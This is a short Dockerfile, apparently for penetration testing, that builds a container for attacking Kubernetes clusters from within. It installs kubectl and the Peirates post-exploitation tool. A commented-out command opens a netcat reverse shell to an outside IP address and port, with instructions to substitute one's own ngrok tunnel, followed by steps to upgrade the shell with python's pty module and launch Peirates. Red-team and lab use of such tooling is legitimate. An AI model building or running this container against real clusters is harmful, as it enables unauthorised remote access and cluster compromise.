FROM bash:latest
# Don't use outside of test environments
# Python3 to upgrade TTY
RUN apk add --update python3 curl
# Peirates to compromise K8s internally
RUN wget https://github.com/inguardians/peirates/releases/download/v1.1.16/peirates-linux-amd64.tar.xz -O /tmp/peirates.tar.xz
RUN curl -L "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/kubectl
RUN chmod +x /tmp/kubectl
RUN tar -xf /tmp/peirates.tar.xz
RUN rm /tmp/peirates.tar.xz
# Change part 2 and 3 to your own ngrok TCP tunnel
# CMD ["nc","35.157.111.131","16556","-e","/bin/sh"]
# Once shell is obtained, upgrade shell with python3 -c "import pty;pty.spawn('/usr/local/bin/bash')"
# Go to /tmp
# tar -xf peirates.tar.xz
# rm *.xf
# cd p*
# ./peirates
# Leave container up instead of reverse shell as we have terminal exec rights
CMD ["/bin/sh"]
